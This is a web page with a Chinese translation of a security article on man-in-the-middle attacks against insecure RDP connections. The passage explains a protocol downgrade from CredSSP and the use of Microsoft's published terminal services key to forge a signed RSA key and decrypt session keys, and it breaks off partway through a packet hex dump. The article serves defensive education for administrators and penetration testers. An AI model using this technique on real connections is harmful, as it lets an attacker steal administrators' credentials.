<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】攻击RDP——如何窃听不安全的RDP连接  - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="rdp安全,攻击RDP,windows安全"/>
    
        <meta name="description" content="系统管理员每天都会使用远程桌面协议（RDP）登录到远程Windows计算机。人们使用它在关键服务器上执行某些管理任务，这些服务器包括具有高权限帐户的域控制器等，它们的登陆凭据都是通过RDP传输的。因此，确保RDP配置的安全性是至关重要的。本文旨在帮您认识到安全地配置Windows环境的重要性。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】攻击RDP——如何窃听不安全的RDP连接 </h2>
                <div class="article-msg">
                    <span class="time">2017-03-22 14:02:58</span>
                    
                                        <span class="read">阅读：11737次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3642"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3642" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://www.exploit-db.com/docs/41621.pdf"
                             target="_blank">来源： exploit-db.com</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2522399780" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2522399780" style="color:#848e99;">shan66</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p4.qhimg.com/t015e9c7484c4fe172d.jpg" title="t015e9c7484c4fe172d.jpg" alt="http://p4.qhimg.com/t015e9c7484c4fe172d.jpg"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2522399780" target="_blank" style="text-decoration: none;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px; color: rgb(0, 112, 192); font-weight: 900;">shan66</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px;"><span style="font-weight: 900;">稿费：300RMB（不服你也来投稿啊！）</span></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px;"><span style="font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">简介&nbsp;</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">系统管理员每天都会使用远程桌面协议（RDP）登录到远程Windows计算机。最常见的情形是，人们使用它在关键服务器上执行某些管理任务，这些服务器包括具有高度特权帐户的域控制器等，它们的登陆凭据都是通过RDP传输的。因此，确保RDP配置的安全性是至关重要的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">但是根据我们的观察，由于配置错误，Active Directory环境中的系统管理员会定期显示（并忽略）证书警告，如下所示：</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t013148f080008c7314.png" title="t01f9f3b74fb82e5beb.png" alt="http://p9.qhimg.com/t01f9f3b74fb82e5beb.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图1：SSL证书警告</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果您的环境中经常遇到这样的警告的话，您将无法识别真正的中间人（MitM）攻击。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">本文旨在帮您认识到认真对待证书警告以及如何安全地配置Windows环境有多么的重要。目标受众是系统管理员、渗透测试人员和安全爱好者。虽然对下列主题的了解没有硬性要求，但我仍然鼓励您进一步深入学习一下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">公钥密码术以及对称密码术（RSA和RC4）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">SSL</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">x509证书</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">TCP</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">Python</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">十六进制数和二进制代码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们将演示MitM是如何嗅探您的凭据的，如果您不小心的话是很容易中招的。这些都不是特别新的技术，例如Cain [2]就是用来干这个的。然而，Cain不仅“年代久远”，代码封闭，而且还只适用于Windows系统。我们想要分析RDP的所有细节和内部工作机制，并尽可能地模拟真实的攻击情形。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">不用说，本文介绍的技术不得用于在未经授权的情况下访问不属于您的任何系统。它们只能在系统所有者完全同意的情况下用于教育目的。否则，你很可能违反法律，当然，具体还取决于你的管辖权。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">对于心急的读者，可以通过参考资料[1]中的链接下载相应的源代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">协议分析</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">让我们启动Wireshark，看看当我们通过RDP连接到服务器时会发生什么：</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01e0fb1d9e8e78cb02.png" title="t018da4997c1bd0480c.png" alt="http://p7.qhimg.com/t018da4997c1bd0480c.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图2：Wireshark中的RDP会话的开头部分内容</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">正如我们所看到的，客户端首先提出了用于RDP会话的安全协议。这里有三个协议：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">标准RDP安全性协议</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">增强型RDP安全或TLS安全性协议</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">CredSSP协议</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在本例中，客户端能够使用前两个协议。注意，标准的RDP安全性协议总是可用的，不需要由客户端指出。TLS或增强的RDP安全性协议，只是将标准RDP安全性协议封装到加密的TLS隧道内而已。顺便说一下，在本文中术语SSL和TLS可是可以互换的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">CredSSP协议虽然也使用TLS隧道，但它不是在受保护的隧道中传输密码，而是使用NTLM或Kerberos进行身份验证。该协议也称为网络级认证（NLA）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">早期的用户身份验证有一个特点，那就是允许服务器可以在用户提交任何凭据（用户名除外）之前拒绝访问，例如，如果用户没有必要的远程访问权限。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在上面的Wireshark会话中，我们可以看到，SSL握手是在客户端和服务器已同意使用增强的RDP安全性协议之后执行的。为此，我们右键单击磋商数据包后的第一个数据包，并将TCP数据流作为SSL解码：</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t016c592ae1cc2f8e57.png" title="t01375f39410d688319.png" alt="http://p1.qhimg.com/t01375f39410d688319.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图3：SSL握手的开头部分内容</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">因此，如果我们想要对一个RDP连接进行中间人攻击的话，不能直接使用SSL代理，因为代理还需要知道RDP。它需要知道何时启动SSL握手，这类似于SMTP或FTP中的StartTLS。我们选择Python来实现这样的代理。为此，我们只需创建受害者客户端连接到的服务器套接字，以及连接到实际服务器的客户端套接字。我们在这些套接字之间转发数据，并在必要时将它们封装到SSL套接字中。当然，我们将密切关注相关数据并根据需要进行修改。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当然，首先要修改的就是客户端提出的协议。客户端可能想告诉服务器它可以执行CredSSP协议，但我们将在相应数据到达服务器的半路上将协议更改为标准RDP安全性协议。在默认配置中，服务器会很乐意使用这个协议的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">利用Python打造用于RDP的MitM代理&nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们的Python脚本的主循环大致如下所示：&nbsp;</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p2.qhimg.com/t01cc3ea18a7c11bb7b.png" title="t01cc3ea18a7c11bb7b.png" alt="http://p2.qhimg.com/t01cc3ea18a7c11bb7b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">函数run()打开套接字，处理协议的协商并启用SSL（如有必要）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">之后，数据就可以在两个套接字之间转发了。如果设置了调试标志，dump_data()函数会将数据作为hexdump打印到屏幕。而parse_rdp()会从数据中提取相应的信息，tamper_data()函数可用于对其进行修改。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">密码学基础知识&nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">因为我们需要借助RSA来搞定标准RDP安全协议，所以我们先来了解一下RSA的基础知识。如果您熟悉这方面的知识的话，可以跳过此部分。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在RSA中，加密、解密和签名纯粹就是数学运算，并且都是针对整数的运算。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">请记住，所有这些操作都是在有限群上完成的[3]。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当生成RSA密钥对时，您需要找到两个大质数p和q。你得到他们的乘积，n = pq（这称为模数），计算φ（n）=（p - 1）（q - 1）（欧拉常数函数），并选择一个与φ(n) 互质的整数e。然后，您需要找到满足</span></p><pre class="brush:plain;toolbar:false">e•d≡1&nbsp;&nbsp;modφ（n）</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">的数字d。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">数字d就是私钥，而e和n则组成公钥。当然，理论上d可以利用n和e求出，但φ（n）却很难计算，除非你知道p和q。这就是为什么RSA的安全性在很大程度上取决于大数分解的难度。到目前为止，没有人知道如何有效地进行大数分解——除非你有一台可以工作的量子计算机[4,5]。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">为了加密消息m，我们只需求其e次幂，然后模n：</span></p><pre class="brush:plain;toolbar:false">c≡me&nbsp;mod&nbsp;n</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">为了对密文c进行解密，我们可以使用私钥指数d进行下列运算：</span></p><pre class="brush:plain;toolbar:false">m≡cd&nbsp;mod&nbsp;n</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">实际上，这是加密运算的逆运算。当然，这里涉及许多数学知识，过于深入的内容我就不介绍了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">签名与解密相同。你只需在消息的哈希值上执行相同的运算即可。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果m或c大于256位的话，这些运算的开销将非常大，所以通常只使用RSA来加密对称密钥。然后，通过使用刚生成的密钥通过对称密码（通常为AES）算法来加密实际的消息。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">攻陷标准RDP安全协议&nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">其实，攻破这个协议难度并不太大，因为它的设计本身就存在很大隐患，下面我会具体加以讲解。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">标准RDP安全协议的运行机制是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">客户声明打算使用标准RDP安全协议。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">服务器同意并将自己的RSA公钥与“Server Random”一起发送到客户端。公钥以及其他信息（例如主机名等）的集合称为“证书”。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用终端服务私钥对证书进行签名，以确保真实性。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">客户端通过使用终端服务公钥验证证书。如果验证成功，它就使用服务器的公钥来加密“Client Random”，并将其发送给服务器。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">服务器使用自己的私钥解密Client Random。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">服务器和客户端从Server Random和Client Random中求出会话密钥[6]。这些密钥用于对会话的其余部分进行对称加密。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">请注意，所有这些都是以纯文本形式发送的，而不是在SSL隧道内发送的。原则上讲这没有什么问题，微软只是试图实现自己的SSL加密技术。然而，加密技术是可没想象的那么容易[7]，按一般规律，你始终应该依靠已建立的解决方案，因为它们都是经过时间考验过得，而不是实现自己的解决方案。因此，微软在这里犯了一个根本性的错误——我实在想不通他们为什么要这样做。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">你能发现这里的错误吗？客户端是如何获取终端服务公钥的？答案是：它是预装的。这意味着它在所有系统上使用相同的密钥。这意味着私钥也都是一样的！所以，它可以从任何Windows安装上面提取到。事实上，我们甚至不需要这样做，因为现在微软已经决定正式发布它，这样一来，我们可以直接从microsoft.com网站上找到它们[8]。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在导出会话密钥后，可以使用多个安全级别[9]进行对称加密：无、40位RC4、56位RC4、128位RC4或3DES（称为FIPS）。默认值为128位RC4（“High”）。但是如果我们能够窃听密钥的话，那么加密的强度就无所谓了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">所以我们的计划是很明显的：当发现服务器的公钥时，我们快速生成相同大小的自己的RSA密钥对，并用它覆盖原始密钥。当然，我们需要使用终端服务私钥生成我们的公钥的签名，并用它替换原始签名。然后，在客户端成功验证我们的假公钥之后，我们接收其Client Random。我们使用我们的私钥对它进行解密，将其写下来以便使用服务器的公钥重新加密它。仅此而已！这样一来，我们就可以被动地读取客户端和服务器之间的加密流量了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">唯一的挑战是正确解析RDP数据包。这才是我们感兴趣的：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">From&nbsp;server:
00000000:&nbsp;03&nbsp;00&nbsp;02&nbsp;15&nbsp;02&nbsp;F0&nbsp;80&nbsp;7F&nbsp;66&nbsp;82&nbsp;02&nbsp;09&nbsp;0A&nbsp;01&nbsp;00&nbsp;02&nbsp;........f.......
00000010:&nbsp;01&nbsp;00&nbsp;30&nbsp;1A&nbsp;02&nbsp;01&nbsp;22&nbsp;02&nbsp;01&nbsp;03&nbsp;02&nbsp;01&nbsp;00&nbsp;02&nbsp;01&nbsp;01&nbsp;..0...&quot;.........
00000020:&nbsp;02&nbsp;01&nbsp;00&nbsp;02&nbsp;01&nbsp;01&nbsp;02&nbsp;03&nbsp;00&nbsp;FF&nbsp;F8&nbsp;02&nbsp;01&nbsp;02&nbsp;04&nbsp;82&nbsp;................
00000030:&nbsp;01&nbsp;E3&nbsp;00&nbsp;05&nbsp;00&nbsp;14&nbsp;7C&nbsp;00&nbsp;01&nbsp;2A&nbsp;14&nbsp;76&nbsp;0A&nbsp;01&nbsp;01&nbsp;00&nbsp;......|..*.v....
00000040:&nbsp;01&nbsp;C0&nbsp;00&nbsp;4D&nbsp;63&nbsp;44&nbsp;6E&nbsp;81&nbsp;CC&nbsp;01&nbsp;0C&nbsp;10&nbsp;00&nbsp;04&nbsp;00&nbsp;08&nbsp;...McDn.........
00000050:&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;01&nbsp;00&nbsp;00&nbsp;00&nbsp;03&nbsp;0C&nbsp;10&nbsp;00&nbsp;EB&nbsp;03&nbsp;04&nbsp;................
00000060:&nbsp;00&nbsp;EC&nbsp;03&nbsp;ED&nbsp;03&nbsp;EE&nbsp;03&nbsp;EF&nbsp;03&nbsp;02&nbsp;0C&nbsp;AC&nbsp;01&nbsp;02&nbsp;00&nbsp;00&nbsp;................
00000070:&nbsp;00&nbsp;02&nbsp;00&nbsp;00&nbsp;00&nbsp;20&nbsp;00&nbsp;00&nbsp;00&nbsp;78&nbsp;01&nbsp;00&nbsp;00&nbsp;D9&nbsp;5E&nbsp;A3&nbsp;.....&nbsp;...x....^.
